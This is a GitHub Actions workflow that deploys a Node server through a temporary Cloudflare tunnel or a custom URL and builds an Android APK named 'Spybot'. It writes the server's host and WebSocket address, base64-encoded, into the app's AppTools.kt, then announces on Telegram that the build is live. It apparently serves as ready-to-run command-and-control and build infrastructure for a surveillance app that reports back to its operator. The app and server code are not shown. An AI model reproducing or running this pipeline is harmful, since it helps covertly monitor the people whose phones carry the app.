name: Deploy Server & Build APK

on:
  workflow_dispatch:
    inputs:
      duration:
        description: "Server runtime (minutes)"
        required: true
        default: "30"
        type: choice
        options: ["5", "10", "15", "30", "60"]

      build_type:
        description: "APK build type"
        required: true
        default: "release"
        type: choice
        options: ["debug", "release", "both"]

      custom_base_url:
        description: "Custom URL (http://example.com or https://example.com). Leave empty to use Cloudflare."
        required: false
        default: ""
        type: string

env:
  TELEGRAM_BOT_TOKEN: ${{ secrets.TELEGRAM_BOT_TOKEN }}
  TELEGRAM_CHAT_ID: ${{ secrets.TELEGRAM_CHAT_ID }}

jobs:
  deploy-and-build:
    runs-on: ubuntu-latest
    timeout-minutes: 180

    steps:
      # ----------------------------------------------------
      # CHECK SECRETS
      # ----------------------------------------------------
      - name: Verify secrets
        shell: bash
        run: |
          if [ -z "${TELEGRAM_BOT_TOKEN}" ] || [ -z "${TELEGRAM_CHAT_ID}" ]; then
            echo "Telegram secrets missing"
            exit 1
          fi

      # ----------------------------------------------------
      # CHECKOUT
      # ----------------------------------------------------
      - uses: actions/checkout@v4

      # ----------------------------------------------------
      # DETECT VERSION
      # ----------------------------------------------------
      - name: Detect app version
        id: version
        run: |
          FILE=$(find ./app -name "build.gradle*" | head -n 1)
          VERSION=$(grep "versionName" "$FILE" | head -1 | sed 's/.*versionName[ =]*"\{0,1\}//' | sed 's/".*//')
          echo "version_name=$VERSION" >> $GITHUB_OUTPUT

      # ----------------------------------------------------
      # START SERVER
      # ----------------------------------------------------
      - name: Setup Node
        uses: actions/setup-node@v4
        with:
          node-version: 20

      - name: Install server dependencies
        working-directory: ./server
        run: npm install

      - name: Create .env
        working-directory: ./server
        run: |
          echo "TELEGRAM_BOT_TOKEN=${TELEGRAM_BOT_TOKEN}" > .env
          echo "TELEGRAM_CHAT_ID=${TELEGRAM_CHAT_ID}" >> .env
          echo "PORT=8999" >> .env

      - name: Start server
        working-directory: ./server
        run: |
          nohup npm start > /tmp/server.log 2>&1 &
          for i in {1..20}; do
            curl -s http://localhost:8999/ && break
            sleep 2
          done

      # ----------------------------------------------------
      # CLOUDFLARE TUNNEL (SKIPPED IF CUSTOM URL PROVIDED)
      # ----------------------------------------------------
      - name: Create tunnel
        id: tunnel
        if: ${{ github.event.inputs.custom_base_url == '' }}
        run: |
          curl -L -o cloudflared.deb https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64.deb
          sudo dpkg -i cloudflared.deb
          nohup cloudflared tunnel --url http://localhost:8999 > /tmp/tunnel.log 2>&1 &
          for i in {1..40}; do
            sleep 2
            URL=$(grep -oE 'https://[a-zA-Z0-9.-]+\.trycloudflare\.com' /tmp/tunnel.log | head -1 || true)
            if [ -n "$URL" ]; then
              echo "tunnel_url=$URL" >> $GITHUB_OUTPUT
              break
            fi
          done

      # ----------------------------------------------------
      # VALIDATE CUSTOM URL
      # ----------------------------------------------------
      - name: Validate custom URL
        if: ${{ github.event.inputs.custom_base_url != '' }}
        run: |
          URL="${{ github.event.inputs.custom_base_url }}"
          if [[ ! "$URL" =~ ^https?:// ]]; then
            echo "Custom URL must start with http:// or https://"
            exit 1
          fi
          STATUS=$(curl -s -o /dev/null -w "%{http_code}" "$URL")
          if [[ "$STATUS" -lt 200 || "$STATUS" -ge 400 ]]; then
            echo "Custom URL $URL is not reachable. HTTP status: $STATUS"
            exit 1
          fi
          echo "Custom URL $URL is valid and reachable."

      # ----------------------------------------------------
      # CONFIGURE APPTOOLS
      # ----------------------------------------------------
      - name: Configure AppTools.kt
        env:
          CUSTOM: ${{ github.event.inputs.custom_base_url }}
          TUNNEL: ${{ steps.tunnel.outputs.tunnel_url || '' }}
        run: |
          if [ -n "$CUSTOM" ]; then
            BASE="${CUSTOM%/}"
          else
            if [ -z "$TUNNEL" ]; then
              echo "Tunnel URL not available!"
              exit 1
            fi
            BASE="${TUNNEL%/}"
          fi
          if [[ "$BASE" =~ ^https:// ]]; then
            HOST="${BASE}/"
            SOCKET="${BASE/https:/wss:}/"
          elif [[ "$BASE" =~ ^http:// ]]; then
            HOST="${BASE}/"
            SOCKET="${BASE/http:/ws:}/"
          else
            echo "Invalid domain format: $BASE"
            exit 1
          fi
          JSON="{\"host\":\"$HOST\",\"socket\":\"$SOCKET\"}"
          DATA=$(echo -n "$JSON" | base64 -w0)
          FILE="./app/app/src/main/java/com/spybot/app/Utils/AppTools.kt"
          sed -i "s|private const val DEFAULT_DATA = \".*\"|private const val DEFAULT_DATA = \"$DATA\"|" "$FILE"
          echo "Configured AppTools.kt with BASE=$BASE"

      # ----------------------------------------------------
      # BUILD APK
      # ----------------------------------------------------
      - name: Setup Java
        uses: actions/setup-java@v4
        with:
          distribution: temurin
          java-version: 17

      - name: Build APK
        working-directory: ./app
        run: |
          chmod +x gradlew
          case "${{ github.event.inputs.build_type }}" in
            debug) ./gradlew assembleDebug --no-daemon ;;
            release) ./gradlew assembleRelease --no-daemon ;;
            both) ./gradlew assembleDebug assembleRelease --no-daemon ;;
          esac

      # ----------------------------------------------------
      # COLLECT APK
      # ----------------------------------------------------
      - name: Collect APK
        run: |
          mkdir -p output
          find ./app -name "*.apk" -type f -exec cp {} output/ \;

      - name: Upload APK
        uses: actions/upload-artifact@v4
        with:
          name: Spybot-APK
          path: output/*.apk
          retention-days: 7

      # ----------------------------------------------------
      # TELEGRAM NOTIFICATION
      # ----------------------------------------------------
      - name: Notify Telegram
        run: |
          MSG="Spybot v${{ steps.version.outputs.version_name }} is live."
          curl -s -X POST "https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage" \
            -d chat_id=${TELEGRAM_CHAT_ID} \
            -d text="$MSG"

      # ----------------------------------------------------
      # KEEP SERVER RUNNING
      # ----------------------------------------------------
      - name: Keep alive
        run: sleep $(( ${{ github.event.inputs.duration }} * 60 ))

      # ----------------------------------------------------
      # CLEANUP
      # ----------------------------------------------------
      - name: Cleanup
        if: always()
        run: |
          pkill -f cloudflared || true
          pkill -f node || true
